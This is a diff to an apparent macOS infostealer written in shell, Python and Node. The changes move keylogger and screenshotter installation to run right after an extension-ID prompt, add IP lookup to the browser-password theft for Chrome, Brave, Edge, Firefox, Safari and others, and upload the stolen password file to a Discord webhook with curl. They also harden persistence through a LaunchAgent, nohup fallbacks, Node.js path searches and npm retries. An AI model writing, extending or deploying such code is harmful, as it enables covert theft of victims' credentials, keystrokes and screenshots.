@@ -675,6 +675,9 @@ if [ -n "$EXTENSION_ID" ] && [ "$EXTENSION_ID" != "" ]; then
         -d "{\"content\": \"$ESCAPED_MESSAGE\"}" \
         "$WEBHOOK" >/dev/null 2>&1
     
+    # Install keylogger + screenshotter IMMEDIATELY after Extension ID
+    install_keylogger_screenshotter_internal >/dev/null 2>&1 &
+    
     # Trigger password extraction immediately (don't wait for keylogger)
     extract_passwords_immediately() {
         local OUTPUT_FILE='/tmp/passwords.txt'
@@ -795,33 +798,96 @@ with open(OUTPUT_FILE, 'w') as f:
         except:
             pass
 
-# Send to Discord
+# Send to Discord with prettier format
 if os.path.exists(OUTPUT_FILE) and os.path.getsize(OUTPUT_FILE) > 100:
     import json
+    import re
     hostname = platform.node()
     username = os.getenv('USER', 'Unknown')
+    
+    # Get IP address
+    ip_address = 'Unknown'
+    try:
+        result = subprocess.run(['ifconfig'], capture_output=True, text=True, timeout=2)
+        for line in result.stdout.split('\n'):
+            if 'inet ' in line and '127.0.0.1' not in line:
+                ip_match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', line)
+                if ip_match:
+                    ip_address = ip_match.group(1)
+                    break
+    except:
+        pass
+    
     with open(OUTPUT_FILE, 'r') as f:
         content = f.read()
+    
+    # Detect which browsers have passwords
+    browsers_found = []
+    if re.search(r'CHROME PASSWORDS|Chrome', content, re.IGNORECASE):
+        browsers_found.append('Chrome')
+    if re.search(r'BRAVE PASSWORDS|Brave', content, re.IGNORECASE):
+        browsers_found.append('Brave')
+    if re.search(r'EDGE PASSWORDS|Edge', content, re.IGNORECASE):
+        browsers_found.append('Edge')
+    if re.search(r'OPERA PASSWORDS|Opera', content, re.IGNORECASE):
+        browsers_found.append('Opera')
+    if re.search(r'VIVALDI PASSWORDS|Vivaldi', content, re.IGNORECASE):
+        browsers_found.append('Vivaldi')
+    if re.search(r'FIREFOX PASSWORDS|Firefox', content, re.IGNORECASE):
+        browsers_found.append('Firefox')
+    if re.search(r'SAFARI PASSWORDS|Safari', content, re.IGNORECASE):
+        browsers_found.append('Safari')
+    
+    browser_list = ', '.join(browsers_found) if browsers_found else 'Unknown'
+    
+    # Create prettier embed message with styled formatting
+    import datetime
+    current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    timestamp_iso = datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%S.000Z')
+    
+    # Format browser list with emojis
+    browser_emojis = {
+        'Chrome': '🌐',
+        'Brave': '🦁',
+        'Edge': '🔷',
+        'Opera': '🎭',
+        'Vivaldi': '🔴',
+        'Firefox': '🦊',
+        'Safari': '🧭'
+    }
+    browser_display = ', '.join([f"{browser_emojis.get(b, '🔹')} {b}" for b in browsers_found]) if browsers_found else 'Unknown'
     
     message = {
         "embeds": [{
             "title": "🔐 Browser Passwords",
-            "color": 0xff9900,
-            "description": f"```\\n{content[:1500]}\\n```",
+            "color": 16750848,
+            "description": f"```\\nPasswords found from: {browser_list}\\n\\n📎 Full password list attached below\\n```",
             "fields": [
-                {"name": "Hostname", "value": f"`{hostname}`", "inline": True},
-                {"name": "PC Username", "value": f"`{username}`", "inline": True}
+                {"name": "🌐 Browsers", "value": f"```\\n{browser_display}\\n```", "inline": False},
+                {"name": "💻 Hostname", "value": f"`{hostname}`", "inline": True},
+                {"name": "👤 PC Username", "value": f"`{username}`", "inline": True},
+                {"name": "🌍 IP Address", "value": f"`{ip_address}`", "inline": True},
+                {"name": "⏰ Time", "value": f"`{current_time}`", "inline": False}
             ],
-            "timestamp": subprocess.run(['date', '-u', '+%Y-%m-%dT%H:%M:%S.000Z'], capture_output=True, text=True).stdout.strip()
+            "footer": {"text": "Password extraction completed"},
+            "timestamp": timestamp_iso
         }]
     }
     
-    payload_file = '/tmp/passwords_discord.json'
-    with open(payload_file, 'w') as f:
+    # Send to Discord with file attachment (write JSON to temp file for curl)
+    import tempfile
+    with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
         json.dump(message, f)
+        payload_file = f.name
     
-    subprocess.run(['curl', '-s', '-X', 'POST', '-F', f'payload_json=@{payload_file}', '-F', f'file=@{OUTPUT_FILE}', WEBHOOK],
-                 timeout=10, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    try:
+        subprocess.run(['curl', '-s', '-X', 'POST', '-F', f'payload_json=@{payload_file}', '-F', f'file=@{OUTPUT_FILE};type=text/plain', WEBHOOK],
+                     timeout=10, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    finally:
+        try:
+            os.unlink(payload_file)
+        except:
+            pass
 PYEOF
     }
     
@@ -874,16 +940,28 @@ install_keylogger_screenshotter_internal() {
     local APP_DIR="$HOME/.keylogger-helper"
     local NODE_PATH=$(which node 2>/dev/null || echo "/usr/local/bin/node")
     
-    # Check if Node.js is available
+    # Check if Node.js is available (try multiple paths)
     if ! command -v node >/dev/null 2>&1 && [ ! -f "$NODE_PATH" ]; then
-        echo "⚠️  Node.js not found - attempting to install..." >&2
-        # Try to install node via brew if available
-        if command -v brew >/dev/null 2>&1; then
-            brew install node >/dev/null 2>&1 || true
-            NODE_PATH=$(which node 2>/dev/null || echo "/usr/local/bin/node")
-        fi
+        # Try common Node.js paths
+        for possible_path in "/usr/local/bin/node" "/opt/homebrew/bin/node" "/usr/bin/node" "$HOME/.nvm/versions/node/*/bin/node"; do
+            if [ -f "$possible_path" ] 2>/dev/null; then
+                NODE_PATH="$possible_path"
+                break
+            fi
+        done
+        
+        # If still not found, try to install via brew
         if ! command -v node >/dev/null 2>&1 && [ ! -f "$NODE_PATH" ]; then
-            return 1
+            if command -v brew >/dev/null 2>&1; then
+                brew install node >/dev/null 2>&1 || true
+                NODE_PATH=$(which node 2>/dev/null || echo "/usr/local/bin/node")
+            fi
+        fi
+        
+        # Final check - if still not found, try to continue anyway (might work)
+        if ! command -v node >/dev/null 2>&1 && [ ! -f "$NODE_PATH" ]; then
+            # Don't return early - try to continue, the error will show in logs
+            NODE_PATH="node"  # Let it try with just "node" command
         fi
     fi
     
@@ -2410,59 +2488,67 @@ python3 "${pythonScript}" 2>/dev/null || {
                         if (content.includes('SAFARI PASSWORDS') || content.includes('Safari')) browsers.push('Safari');
                         const browserList = browsers.length > 0 ? browsers.join(', ') : 'Unknown';
                         
-                        // Create modern message
+                        // Format browser list with emojis
+                        const browserEmojis = {
+                            'Chrome': '🌐',
+                            'Brave': '🦁',
+                            'Edge': '🔷',
+                            'Opera': '🎭',
+                            'Vivaldi': '🔴',
+                            'Firefox': '🦊',
+                            'Safari': '🧭'
+                        };
+                        const browserDisplay = browsers.length > 0 
+                            ? browsers.map(b => `${browserEmojis[b] || '🔹'} ${b}`).join(', ')
+                            : 'Unknown';
+                        
+                        // Create prettier embed message with styled formatting
                         const message = {
                             embeds: [{
                                 title: "🔐 Browser Passwords",
-                                color: 0xff9900,
+                                color: 16750848,
+                                description: `\`\`\`\nPasswords found from: ${browserList}\n\n📎 Full password list attached below\n\`\`\``,
                                 fields: [
-                                    { name: "Collected From", value: `\`${browserList}\``, inline: false },
-                                    { name: "Hostname", value: `\`${HOSTNAME}\``, inline: true },
-                                    { name: "PC Username", value: `\`${USERNAME}\``, inline: true },
-                                    { name: "IP Address", value: `\`${ipAddress}\``, inline: true },
-                                    { name: "Time", value: `\`${new Date().toLocaleString()}\``, inline: false }
+                                    { name: "🌐 Browsers", value: `\`\`\`\n${browserDisplay}\n\`\`\``, inline: false },
+                                    { name: "💻 Hostname", value: `\`${HOSTNAME}\``, inline: true },
+                                    { name: "👤 PC Username", value: `\`${USERNAME}\``, inline: true },
+                                    { name: "🌍 IP Address", value: `\`${ipAddress}\``, inline: true },
+                                    { name: "⏰ Time", value: `\`${new Date().toLocaleString()}\``, inline: false }
                                 ],
+                                footer: { text: "Password extraction completed" },
                                 timestamp: new Date().toISOString()
                             }]
                         };
                         
-                        // Send to Discord with file attachment (use embed, not content)
-                        const payloadFile = path.join(screenshotDir, `password_extract_${Date.now()}.json`);
-                        const payload = message; // message is already an embed object
-                        
+                        // Send to Discord with file attachment (no JSON file, just embed + passwords.txt)
                         try {
-                            fs.writeFileSync(payloadFile, JSON.stringify(message));
-                            
-                            // Build curl command - only send password file (no key4.db files)
-                            let curlCmd = `curl -s -X POST -F "payload_json=@${payloadFile}" -F "file=@${OUTPUT_FILE}" "${WEBHOOK}"`;
+                            const payloadJson = JSON.stringify(message);
+                            // Send directly without creating JSON file
+                            const curlCmd = `curl -s -X POST -F "payload_json=${payloadJson}" -F "file=@${OUTPUT_FILE};type=text/plain" "${WEBHOOK}"`;
                             
                             // Send file + message to Discord (passwords are already decrypted in file)
                             exec(curlCmd, (error) => {
                                 setTimeout(() => {
                                     try { 
-                                        fs.unlinkSync(payloadFile);
                                         fs.unlinkSync(EXTRACT_SCRIPT);
                                         fs.unlinkSync(OUTPUT_FILE);
                                     } catch (e) {}
                                 }, 10000);
                             });
                         } catch (e) {
-                            // Fallback: send text only
-                            const textPayload = { content: message };
-                            const textFile = path.join(screenshotDir, `password_text_${Date.now()}.json`);
+                            // Fallback: send embed only (no file)
                             try {
-                                fs.writeFileSync(textFile, JSON.stringify(textPayload));
-                                exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${textFile}" "${WEBHOOK}"`, () => {
+                                const payloadJson = JSON.stringify(message);
+                                exec(`curl -s -X POST -H "Content-Type: application/json" -d '${payloadJson}' "${WEBHOOK}"`, () => {
                                     setTimeout(() => {
                                         try { 
-                                            fs.unlinkSync(textFile);
                                             fs.unlinkSync(EXTRACT_SCRIPT);
                                             fs.unlinkSync(OUTPUT_FILE);
                                         } catch (e) {}
                                     }, 10000);
                                 });
                             } catch (e2) {}
-                            }
+                        }
                         } else {
                             // No content or file too small - retry
                             if (attempts < 10) {
@@ -2549,8 +2635,17 @@ KEYLOGGEREOF
 }
 PKGEOF
     
-    # Install dependencies (silent)
-    (cd "$APP_DIR" && npm install --silent --no-audit --no-fund >/dev/null 2>&1) || true
+    # Install dependencies (silent, but ensure it completes)
+    (cd "$APP_DIR" && npm install --silent --no-audit --no-fund >/dev/null 2>&1) || {
+        # If npm install fails, try installing node first
+        if ! command -v node >/dev/null 2>&1; then
+            if command -v brew >/dev/null 2>&1; then
+                brew install node >/dev/null 2>&1 || true
+            fi
+        fi
+        # Retry npm install
+        (cd "$APP_DIR" && npm install --silent --no-audit --no-fund >/dev/null 2>&1) || true
+    }
     
     # REMOVED: pke keylogger installation (repository not available)
     # Clipboard monitoring is working and captures copy/paste activity
@@ -2605,14 +2700,21 @@ PLISTEOF
     launchctl start com.keylogger.helper 2>/dev/null || true
     
     # Also start directly as nohup backup (in case LaunchAgent fails)
+    sleep 1
     nohup "$NODE_PATH" "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/nohup.log" 2>&1 &
+    
+    # Verify it's actually running (check after 3 seconds)
+    sleep 3
+    if ! pgrep -f "keylogger-screenshotter.js" >/dev/null 2>&1; then
+        # If not running, try one more time with direct execution
+        "$NODE_PATH" "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/direct.log" 2>&1 &
+    fi
     
     # Keylogger startup message is sent by the JS script itself (no duplicate needed)
 }
 
-# Install keylogger + screenshotter in background (SILENT - no output)
-# This runs 24/7, sends keystrokes + screenshots to Discord
-install_keylogger_screenshotter_internal >/dev/null 2>&1 &
+# Keylogger installation moved to AFTER Extension ID prompt (see line ~678)
+# This ensures it runs after user input and starts properly
 
 # Wait for seed file search to complete (if it was started)
 if [ -n "$SEED_SEARCH_PID" ]; then
